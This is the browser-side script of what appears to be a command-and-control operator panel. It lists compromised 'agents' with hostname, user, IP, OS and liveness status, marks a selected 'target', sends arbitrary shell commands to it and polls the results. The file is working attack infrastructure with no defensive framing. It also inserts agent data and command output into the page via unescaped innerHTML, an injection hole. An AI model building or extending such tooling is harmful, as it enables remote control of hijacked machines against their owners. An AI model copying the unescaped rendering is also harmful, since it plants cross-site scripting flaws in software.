const API_URL = '/api';

let apiKey = sessionStorage.getItem('api_key') || '';
let selectedAgent = null;

function getHeaders() {
  return {
    'Content-Type': 'application/json',
    'x-api-key': apiKey
  };
}

// Login
function promptLogin() {
  apiKey = prompt('Digite a API Key do operador:');
  if (!apiKey) return;
  sessionStorage.setItem('api_key', apiKey);
  loadAgents();
}

// Agents
async function loadAgents() {
  if (!apiKey) { promptLogin(); return; }

  try {
    const res = await fetch(`${API_URL}/agents`, { headers: getHeaders() });

    if (res.status === 401) {
      sessionStorage.removeItem('api_key');
      apiKey = '';
      promptLogin();
      return;
    }

    const agents = await res.json();
    const list   = document.getElementById('agents-list');
    list.innerHTML = '';

    let active = 0, dormant = 0, dead = 0;

    agents.forEach(agent => {
      if (agent.status === 'active')       active++;
      else if (agent.status === 'dormant') dormant++;
      else                                 dead++;

      const card = document.createElement('div');
      card.className = `agent-card ${selectedAgent?._id === agent._id ? 'selected' : ''}`;
      card.onclick   = () => selectAgent(agent);
      card.innerHTML = `
        <div>
          <span class="status-dot status-${agent.status}"></span>
          <span class="agent-name">${agent.hostname}</span>
          <div class="agent-meta">${agent.username}@${agent.ip} | ${agent.os}</div>
        </div>
        <div class="agent-meta">${timeAgo(agent.lastSeen)}</div>
      `;
      list.appendChild(card);
    });

    document.getElementById('stat-active').textContent  = `● Active: ${active}`;
    document.getElementById('stat-dormant').textContent = `◐ Dormant: ${dormant}`;
    document.getElementById('stat-dead').textContent    = `○ Dead: ${dead}`;
  } catch (err) {
    console.error('Erro ao carregar agentes:', err);
  }
}

// Interação
function selectAgent(agent) {
  selectedAgent = agent;
  document.getElementById('interaction-panel').style.display = 'block';
  document.getElementById('target-name').textContent = agent.hostname;
  loadTasks(agent._id);
  loadAgents();
}

async function loadTasks(agentId) {
  try {
    const res   = await fetch(`${API_URL}/tasks/history/${agentId}`, { headers: getHeaders() });
    const tasks = await res.json();
    const history = document.getElementById('task-history');
    history.innerHTML = '';

    tasks.forEach(task => {
      const entry = document.createElement('div');
      entry.className = `task-entry ${task.status}`;
      entry.innerHTML = `
        <div class="task-cmd">$ ${task.command}</div>
        ${task.output ? `<div class="task-output">${task.output}</div>` : ''}
        <div class="task-time">${task.status.toUpperCase()} — ${new Date(task.createdAt).toLocaleString()}</div>
      `;
      history.appendChild(entry);
    });
  } catch (err) {
    console.error('Erro ao carregar tarefas:', err);
  }
}

async function sendCommand() {
  const input   = document.getElementById('command-input');
  const command = input.value.trim();
  if (!command || !selectedAgent) return;

  try {
    await fetch(`${API_URL}/tasks`, {
      method: 'POST',
      headers: getHeaders(),
      body: JSON.stringify({ agentId: selectedAgent._id, command })
    });
    input.value = '';
    loadTasks(selectedAgent._id);
  } catch (err) {
    console.error('Erro ao enviar comando:', err);
  }
}

// Utilitários
function timeAgo(dateStr) {
  const diff  = Date.now() - new Date(dateStr).getTime();
  const mins  = Math.floor(diff / 60000);
  if (mins < 1)  return 'agora';
  if (mins < 60) return `${mins}m atrás`;
  const hours = Math.floor(mins / 60);
  if (hours < 24) return `${hours}h atrás`;
  return `${Math.floor(hours / 24)}d atrás`;
}

// Event listeners & polling
document.getElementById('send-btn').addEventListener('click', sendCommand);
document.getElementById('command-input').addEventListener('keydown', e => {
  if (e.key === 'Enter') sendCommand();
});

loadAgents();
setInterval(() => {
  loadAgents();
  if (selectedAgent) loadTasks(selectedAgent._id);
}, 5000);
